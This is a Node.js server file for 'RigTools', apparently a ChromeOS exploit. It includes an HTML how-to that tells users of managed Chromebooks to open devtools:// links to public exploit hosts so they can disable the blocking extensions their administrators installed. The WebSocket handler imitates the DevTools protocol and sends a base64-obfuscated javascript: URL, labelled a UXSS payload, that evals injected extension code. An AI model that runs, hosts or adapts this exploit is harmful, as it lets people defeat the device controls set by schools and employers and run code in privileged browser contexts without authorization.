import { WebSocketServer } from "ws";
import { createServer } from "http";
import finalhandler from "finalhandler";
import serveStatic from "serve-static";
import * as readline from 'readline-sync';
import * as fs from "fs";
import path from "path";

const WebSocket_port = 8080;
const HTTP_port = 9123;

// Serve static files
const serve = serveStatic("./");

// Custom HTML page to show when visiting WebSocket port as a regular HTTP request
const customHtmlPage = `
    <head>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
<style>
h1,
h3,
p,
ul,
ol {
  text-align: center;
}
ul,
ol {
  list-style-position: inside; /* This makes bullets/numbers align with the text */
  padding-left: 0; /* Remove left padding */
}
li {
  display: block; /* Ensure list items are centered as block elements */
  margin-left: auto;
  margin-right: auto;
}

</style>
</head>

<h1 id="how-to-use-rigtools-updated">How to use RigTools (UPDATED)</h1> <hr>
<h3 id="requirements">Requirements:</h3>
<ul>
<li>A brain</li>
<li>A Chromebook on 127 (128 apparently) or below</li>
<li>An internet connection</li>
<li>A blocking extension</li>
</ul>
<hr>
<h3 id="links">Links:</h3>
<ul>
<li><code>devtools://devtools/bundled/devtools_app.html?experiments=true&amp;ws=rigtools.appleflyer.xyz:5506</code> (5 payload UI)</li>
<li><code>devtools://devtools/bundled/devtools_app.html?experiments=true&amp;wss=rig.ccsd.store</code> </li>
<li><code>devtools://devtools/bundled/devtools_app.html?experiments=true&amp;ws=sincereham222.cc:8080</code> (old UI)</li>
<li><code>devtools://devtools/bundled/devtools_app.html?experiments=true&amp;wss=rwpk9g-8080.csb.app</code> <br><br>
<em><strong>Note</strong>: For links with the updated UI, only go to step 4 bc the rest is self-explanatory. Also, the images are not relevant for the updated UI.</em>
<strong>WARNING:</strong> Links may sometimes be down. If so, try a different one.</li>
</ul>
<hr>
<h3 id="instructions">Instructions:</h3>
<ol>
<li>Open <code>devtools://devtools/bundled/devtools_app.html</code></li>
<li>Open one of the links above in a new tab (I recommend <code>rig.ccsd.store</code>, it has the new UI and is almost always up)</li>
<li>Double click the gray box (image below)</li>
<li>If you have specific extension buttons, click your extension button. Otherwise, click the extension id button and paste in your blocking extension&#39;s id (it has to be installed by administrator and it has to have the ability to manage other extensions)</li>
<li><em><strong>For people using older UI ONLY:</strong></em> Click the fifth button (P5) <strong>OR</strong> Click &quot;Disable currently running extension&quot;</li>
</ol>
<p><em><strong>Note</strong>: After using rigtools, the chrome.management page will always be located at <code>filesystem:chrome-extension://ext-id/temporary/index.html</code>. It is recommended to bookmark this page as it persists after shutdown and is only overwritten by using rigtools again</em></p>
<hr>
<h3 id="good-scripts">Good Scripts:</h3>
<p><a href="https://discord.com/channels/419123358698045453/1275095763919306812/1286434785199390863">Swamp ULTRA</a></p>
<hr>
<h3 id="repo">Repo:</h3>
<p><a href="https://github.com/FWSmasher/rigtools">https://github.com/FWSmasher/rigtools</a></p>

`;

let globalUID = 0;
let sessionId = "89AC63D12B18F3EE9808C13899C9B695";

// Reading the server configuration
let serverConfig = "{\"updater_url\": \"rigtools.asyncsmasher.com\"}";
try {
    serverConfig = fs.readFileSync('server_config.json');
} catch (e) {
    console.log(`Using default update url ${JSON.parse(serverConfig).updater_url} because it failed to read the file: \n${e}`);
}

// Create a single server to handle both HTTP and WebSocket
const server = createServer((req, res) => {
    // Check if the request is a WebSocket upgrade request
    if (req.headers.upgrade && req.headers.upgrade.toLowerCase() === 'websocket') {
        return;
    }
    
    // Serve the custom HTML page for normal HTTP requests
    res.setHeader("Content-Type", "text/html");
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.writeHead(200);
    res.end(customHtmlPage);
});

// WebSocket server
const wss = new WebSocketServer({ server });

wss.on("connection", function connection(wss_con) {
    wss_con.on("message", async (msg) => {
        const result = {
            payload1: eval(fs.readFileSync('payload.mjs'))
        }
        let htmlFile = fs.readFileSync(new URL('./payloads/index.html', import.meta.url)).toString();
        htmlFile.replace('`', '&#96;');
        let jsFile = fs.readFileSync(new URL('./payloads/index.js', import.meta.url)).toString();
        let json_msg = JSON.parse(msg.toString());
        let { id, method, params } = json_msg;
        console.log(id + "> ", method, params);
        const entry = fs.readFileSync('./entry/entry.html');

        if (method === "Target.setDiscoverTargets") {
            wss_con.send(
                JSON.stringify({
                    method: "Network.requestWillBeSent",
                    params: {
                        request: {
                            url: `javascript: (function () {eval(atob("${btoa(`(${result.payload1.toString().replace("%%EXTJS%%", btoa(jsFile)).replace("%%EXTHTML%%", btoa(htmlFile)).replace(/%%updaterurl%%/g, JSON.parse(serverConfig).updater_url).replace('%%HTMLENTRY%%', btoa(entry.toString()))})()`)}"))})() /********************************************Built-in payload for uxss*/ `,
                        },
                    },
                }),
            );
        }

        wss_con.send(
            JSON.stringify({
                id: id,
                error: null,
                sessionId: sessionId,
                result: {},
            }),
        );
    });
});

// Start the server for both WebSocket and HTTP
server.listen(WebSocket_port, () => {
    console.log(`Server running and WebSocket accessible at ws://localhost:${WebSocket_port}`);
});

createServer((req, res) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    serve(req, res, finalhandler(req, res));
}).listen(HTTP_port);

console.log(`The HTTP server is accessible at http://localhost:${HTTP_port}\n--------`);
console.log(`The WebSocket is accessible at ws://localhost:${WebSocket_port}\n--------`);
